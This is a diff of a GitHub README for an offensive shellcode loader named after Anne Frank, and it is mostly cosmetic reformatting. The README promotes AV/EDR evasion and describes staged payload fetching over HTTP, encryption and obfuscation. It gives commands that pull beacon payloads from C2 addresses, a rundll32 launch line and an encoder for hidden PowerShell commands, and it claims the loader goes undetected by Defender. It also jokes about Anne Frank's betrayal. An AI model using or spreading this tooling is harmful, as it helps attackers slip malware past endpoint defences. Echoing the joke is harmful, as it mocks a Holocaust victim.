@@ -1,12 +1,18 @@
-# AnneFrankInjector
+<p align="center">
+  <img width="681" height="381" alt="AnneFrankInjector Banner" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />
+</p>
 
-<img width="681" height="381" alt="image" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />
-<img width="950" height="898" alt="image" src="https://github.com/user-attachments/assets/88d78a20-bae4-44f6-8321-e9e8fc25a775" />
+<p align="center">
+  <img width="950" height="898" alt="GUI Preview 1" src="https://github.com/user-attachments/assets/88d78a20-bae4-44f6-8321-e9e8fc25a775" />
+</p>
 
 > [!TIP]
-> Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam? If so, please consider giving it a star ⭐!
+> **Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam?**  
+> If so, please consider giving it a star ⭐ on [GitHub](https://github.com/Excalibra/AnneFrankInjector)!
 
-## Table of Contents
+---
+
+## 📖 Table of Contents
 
 - [Goal](#goal)
 - [Features](#features)
@@ -17,12 +23,17 @@
 - [Examples](#examples)
 - [To-Do](#to-do)
 - [Detections](#detections)
+- [Credits](#credits)
 
-## Goal
+---
+
+## 🎯 Goal
 
 AnneFrankInjector is a modern shellcode loader designed for **AV/EDR evasion** during CTFs, red team engagements, and certification exams. It combines multiple injection techniques, encryption, and obfuscation to help your payload stay hidden – until some nosy neighbor (Defender) rats it out.
 
-## Features
+---
+
+## ✨ Features
 
 - **Stageless** – embed shellcode directly into the loader.  
 - **Staged** – fetch shellcode via HTTP (encrypted on the fly).  
@@ -48,7 +59,9 @@ AnneFrankInjector is a modern shellcode loader designed for **AV/EDR evasion** d
 - **Graphical Interface** – all options available via a user‑friendly `tkinter` GUI.
 - **Built‑in Base64 encoder** (UTF‑16LE) – easily encode PowerShell commands for `-EncodedCommand`.
 
-## Installation
+---
+
+## 🛠 Installation
 
 ### Prerequisites
 
@@ -77,14 +90,12 @@ pacman -S mingw-w64-x86_64-clang make nasm
 #### 🐧 Linux (Kali / Debian‑based)
 
 1. **Clone the repository** and enter the folder:
-
    ```bash
    git clone https://github.com/Excalibra/AnneFrankInjector.git
    cd AnneFrankInjector
    ```
 
 2. **Create a virtual environment** and install dependencies:
-
    ```bash
    python3 -m venv env
    source env/bin/activate
@@ -92,20 +103,16 @@ pacman -S mingw-w64-x86_64-clang make nasm
    ```
 
 3. **Run the GUI** (from the root folder):
-
    ```bash
    python af.py
    ```
-
    For command‑line usage, go into the `Linux` folder:
-
    ```bash
    cd Linux
    python main.py -h
    ```
 
 4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
-
    ```bash
    pipx install .
    ```
@@ -113,14 +120,12 @@ pacman -S mingw-w64-x86_64-clang make nasm
 #### 🪟 Windows
 
 1. **Clone the repository** and enter the folder:
-
    ```cmd
    git clone https://github.com/Excalibra/AnneFrankInjector.git
    cd AnneFrankInjector
    ```
 
 2. **Create a virtual environment** and install dependencies:
-
    ```cmd
    python -m venv env
    env\Scripts\activate
@@ -128,27 +133,25 @@ pacman -S mingw-w64-x86_64-clang make nasm
    ```
 
 3. **Run the GUI** (from the root folder):
-
    ```cmd
    python af.py
    ```
-
    For command‑line usage, go into the `Windows` folder:
-
    ```cmd
    cd Windows
    python main.py -h
    ```
 
 4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):
-
    ```cmd
    pipx install .
    ```
 
 > **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.
 
-## Usage
+---
+
+## 🚀 Usage
 
 ### Graphical Interface (GUI)
 
@@ -167,13 +170,17 @@ The window lets you:
 - Optionally sign the loader with a PFX certificate.
 - Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.
 
-<img width="950" height="892" alt="image" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
+<p align="center">
+  <img width="950" height="892" alt="GUI Preview 2" src="https://github.com/user-attachments/assets/ea4b437d-0e71-4d79-b643-22a2593747f8" />
+</p>
 
-<img width="948" height="893" alt="image" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
-
-
+<p align="center">
+  <img width="948" height="893" alt="GUI Preview 3" src="https://github.com/user-attachments/assets/d9bba4dc-3326-48b9-a7ef-1edf4119061d" />
+</p>
 
 **Bonus:** Under the **Tools** menu, you’ll find a **Base64 Encoder (UTF‑16LE)** – perfect for creating PowerShell `-EncodedCommand` strings.
+
+---
 
 ### Command-line Interface (CLI)
 
@@ -222,7 +229,9 @@ If you build a DLL, the exported function is `af`. Execute it with:
 rundll32.exe afloader.dll,af
 ```
 
-## Examples
+---
+
+## 📝 Examples
 
 **Stageless, encrypted, scrambled EXE, 5‑second delay:**
 
@@ -249,7 +258,9 @@ afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beac
 afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "http://192.168.1.100/loader.ps1"
 ```
 
-## To-Do
+---
+
+## 📌 To-Do
 
 - [x] Delay before injection
 - [x] Spawn injection (new process)
@@ -262,7 +273,9 @@ afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "ht
 - [ ] AMSI / ETW bypass
 - [ ] More injection techniques (e.g., EnumWindows)
 
-## Detections
+---
+
+## 🛡 Detections
 
 - Undetected on latest Windows 11 Defender (with delay + spawn injection)
 - Undetected on Windows 10 Defender
@@ -270,7 +283,7 @@ afpacker stageless -p shellcode.bin -e -s --reflective --lnk-stager --c2-url "ht
 
 ---
 
-## Credits - References
+## 🙏 Credits
 
 Most of the code is not from me. Here are the original authors (now properly credited under the new project):
 
@@ -281,3 +294,9 @@ Most of the code is not from me. Here are the original authors (now properly cre
 @ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
 @ klezVirus         - https://github.com/klezVirus/SysWhispers3
 ```
+
+---
+
+<p align="center">
+  Made with ☕ and 🧩 by <a href="https://github.com/Excalibra">Excalibra</a>
+</p>
